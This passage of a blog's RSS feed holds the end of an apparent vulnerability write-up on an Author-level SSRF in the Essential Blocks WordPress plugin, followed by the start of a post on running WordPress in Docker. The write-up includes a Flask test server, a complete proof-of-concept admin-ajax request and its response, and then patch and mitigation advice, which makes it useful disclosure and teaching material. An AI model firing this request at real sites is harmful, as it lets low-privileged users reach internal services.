width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;eb_save_ai_generated_image()&lt;/code&gt; is registered as the callback for the action hook &lt;code&gt;wp_ajax_save_ai_generated_image&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_save_ai_generated_image&amp;#39;, [ $this, &amp;#39;eb_save_ai_generated_image&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thus, when accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=save_ai_generated_image&lt;/code&gt;, &lt;code&gt;eb_save_ai_generated_image()&lt;/code&gt; will be invoked.&lt;/p&gt;&#xA;&lt;p&gt;To reach the &lt;code&gt;wp_remote_get()&lt;/code&gt; execution, the following conditions must be met:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check &lt;code&gt;admin_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ &amp;#39;admin_nonce&amp;#39; ] ), &amp;#39;admin-nonce&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;Nonce Error&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By default, when accessing &lt;code&gt;wp-admin&lt;/code&gt;, &lt;code&gt;admin_nonce&lt;/code&gt; will be set and can be found by inspecting the code and searching for the &lt;code&gt;admin_nonce&lt;/code&gt; keyword.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/admin_nonce.png&#34;&#xA;    alt=&#34;Find admin_nonce by inspecting the code&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Find &lt;code&gt;admin_nonce&lt;/code&gt; by inspecting the code&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Check user-level&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;upload_files&amp;#39; ) ) {&#xA;    wp_send_json_error( __( &amp;#39;You are not authorized to upload files!&amp;#39;, &amp;#39;essential-blocks&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;upload_files&lt;/code&gt; capability requires the user to be Author-level or higher.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;POST request&lt;/code&gt; contains &lt;code&gt;image_url&lt;/code&gt; and &lt;code&gt;prompt&lt;/code&gt; params.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( isset( $_POST[ &amp;#39;image_url&amp;#39; ] ) || isset( $_POST[ &amp;#39;image_b64&amp;#39; ] ) ) &amp;amp;&amp;amp; isset( $_POST[ &amp;#39;prompt&amp;#39; ] ) )&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service using Python:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, jsonify, request, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/test&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;requirements.txt&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;hello&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a request with &lt;code&gt;image_url&lt;/code&gt; pointing to a local service &lt;code&gt;http://127.0.0.1:8001/test&lt;/code&gt; as an &lt;strong&gt;Author&lt;/strong&gt; user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-login.php?loggedout=true&amp;amp;wp_lang=en_US&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C3cc12be38f8f94048309b7fcd31bd2187065311afecea7df5a9f01f5a207072b; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=auth%7C1761189920%7CaUULiwmj9KXCapzU3Q82L7W45WcbXbqHowa8a6yQ2Vz%7C38f09626eae6d08f6cdb9cd1ce781da26c2acdd8ef2fd1822d84a6d76c6c95ad; wp-settings-time-4=1761017121&#xA;&#xA;action=save_ai_generated_image&amp;amp;admin_nonce=9433571df4&amp;amp;prompt=abc&amp;amp;image_url=http://127.0.0.1:8001/test&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Response&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;success&amp;#34;: true,&#xA;  &amp;#34;data&amp;#34;: {&#xA;    &amp;#34;attachment_id&amp;#34;: 355,&#xA;    &amp;#34;url&amp;#34;: &amp;#34;http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png&amp;#34;,&#xA;    &amp;#34;alt&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;    &amp;#34;title&amp;#34;: &amp;#34;abc&amp;#34;,&#xA;    &amp;#34;caption&amp;#34;: &amp;#34;&amp;#34;,&#xA;    &amp;#34;description&amp;#34;: &amp;#34;&amp;#34;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Read the stored file at &lt;code&gt;http://localhost/wp-content/uploads/2025/10/ai-generated-abc-1761019403.png&lt;/code&gt; using &lt;strong&gt;BurpSuite&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-cve-2025-11361/result.png&#34; title=&#34;Content read from the local service&#34; data-thumbnail=&#34;/posts/2025-10-22-cve-2025-11361/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Content read from the local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-cve-2025-11361/result.png&#39; alt=&#34;Result&#34; height=&#34;383&#34; width=&#34;1155&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Content read from the local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition information open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Information&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The content cannot be properly viewed in a browser because the content inside &lt;code&gt;ai-generated-abc-1761019403.png&lt;/code&gt; (&lt;code&gt;&#39;hello&#39;&lt;/code&gt;) does not match the &lt;strong&gt;Content-Type: image/png&lt;/strong&gt; returned, so the browser produces a rendering error.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Versions &lt;strong&gt;≤ 5.7.1&lt;/strong&gt; of &lt;strong&gt;Essential Blocks for Gutenberg&lt;/strong&gt; are vulnerable to &lt;strong&gt;SSRF&lt;/strong&gt; because they use &lt;code&gt;wp_remote_get()&lt;/code&gt; to fetch uncontrolled URLs, allowing an &lt;strong&gt;Author&lt;/strong&gt; user to send requests to internal addresses. The patch in &lt;strong&gt;5.7.2&lt;/strong&gt; uses &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;, adds response code checks, validates MIME and image content, and thus mitigates SSRF.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Update immediately to &lt;strong&gt;v5.7.2&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; instead of &lt;code&gt;wp_remote_get()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always validate responses (HTTP code, MIME, content).&lt;/li&gt;&#xA;&lt;li&gt;Limit timeout, redirects, and file size.&lt;/li&gt;&#xA;&lt;li&gt;Carefully validate input data and user capabilities.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/essential-blocks/vulnerability/wordpress-essential-blocks-plugin-5-7-1-authenticated-author-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Essential Blocks for Gutenberg Plugin &amp;lt;= 5.7.1 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>WordPress Local and Debugging in Docker</title>
      <link>http://localhost:1313/posts/2025-10-22-wordpress-local-and-debugging-docker/</link>
      <pubDate>Wed, 22 Oct 2025 15:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-22-wordpress-local-and-debugging-docker/</guid>
      <category domain="http://localhost:1313/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-22-wordpress-local-and-debugging-docker/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;Continuing&lt;/strong&gt; from the previous guide on &lt;strong&gt;installing WordPress in a local environment&lt;/strong&gt; (&lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;see here&lt;/a&gt;), this post will show you how to &lt;strong&gt;set up WordPress with Docker&lt;/strong&gt; — a modern, flexible, and easily shareable approach.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-use-docker&#34;&gt;&lt;span&gt;Why Use Docker?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-use-docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Docker allows you to package the entire WordPress environment (PHP, MySQL, web server, and source code) into independent containers. This brings several key advantages:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Environment consistency&lt;/strong&gt;: Works the same everywhere, eliminating “works on my machine” issues.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Easy setup and reset&lt;/strong&gt;: Spin up or rebuild your environment in just a few commands.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Isolation and security&lt;/strong&gt;: Each container runs independently, avoiding software conflicts.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Convenient development and debugging&lt;/strong&gt;: Enable Xdebug, monitor logs, or tweak PHP settings without affecting your main system.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Easy sharing&lt;/strong&gt;: Just share the &lt;code&gt;docker-compose.yml&lt;/code&gt; file — others can launch the exact same setup without manual installation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Docker is an &lt;strong&gt;optimal solution&lt;/strong&gt; for developing, testing, and collaborating on WordPress projects — especially useful for developers, teams, or penetration testers who need a consistent, reproducible environment.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup-wordpress-for-hacker-in-docker&#34;&gt;&lt;span&gt;Setup WordPress for Hacker in Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-wordpress-for-hacker-in-docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;prerequisites&#34;&gt;&lt;span&gt;Prerequisites&lt;/span&gt;&#xA;  &lt;a href=&#34;#prerequisites&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;First, install &lt;strong&gt;Docker&lt;/strong&gt;. It’s available on all major operating systems, with installation steps differing slightly per platform.&lt;br&gt;&#xA;See the official guide: &lt;a href=&#34;https://www.docker.com/get-started/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.docker.com/get-started/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;docker-compose&#34;&gt;&lt;span&gt;Docker Compose&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker-compose&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Instead of manually starting containers with &lt;code&gt;docker run&lt;/code&gt;, use &lt;strong&gt;Docker Compose&lt;/strong&gt; — a tool that defines and manages multiple linked containers using &lt;strong&gt;a single configuration file&lt;/strong&gt; (&lt;code&gt;docker-compose.yml&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;For WordPress, you’ll 